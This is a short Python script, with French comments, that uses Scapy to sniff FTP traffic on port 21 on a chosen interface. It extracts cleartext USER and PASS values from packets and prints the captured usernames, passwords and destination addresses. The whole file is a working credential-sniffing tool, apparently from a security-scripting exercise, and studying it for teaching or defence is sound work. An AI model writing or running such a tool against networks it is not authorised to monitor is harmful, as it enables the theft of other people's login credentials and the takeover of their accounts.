#!/usr/bin/python3

import optparse
from scapy.all import *

def ftpSniff(pkt):
	dest = pkt.getlayer(IP).dst #scapy, on voir la destination du paquet IP
	raw = pkt.sprintf('%Raw.load%') #contenu dans load qui est dans raw
	user = re.findall('(?i)USER (.*)',raw) #1er arg = pattern qui va nous permettre de trouver juste l'username,on cherche l'username dans le paquet raw
	pswd = re.findall('(?i)PASS (.*)',raw)
	if user:
		print('[*] Detected FTP login to: ' + str(dest))
		print('[+] User account: ' + str(user[0])) #liste de 1 element
	elif pswd:
		print('[+] Password: ' + str(pswd[0]))

def main():
	parser = optparse.OptionParser('Usage of the program: ' +\
		'-i<interface>')
	parser.add_option('-i', dest='interface', \
		type='string', help='specify interface to listen on')
	(options,args) = parser.parse_args()
	if options.interface == None:
		print(parser.usage)
		exit(0)
	else:
		conf.iface = options.interface
	try:
		sniff(filter='tcp port 21', prn=ftpSniff)
	except KeyboardInterrupt:
		exit(0)
main()
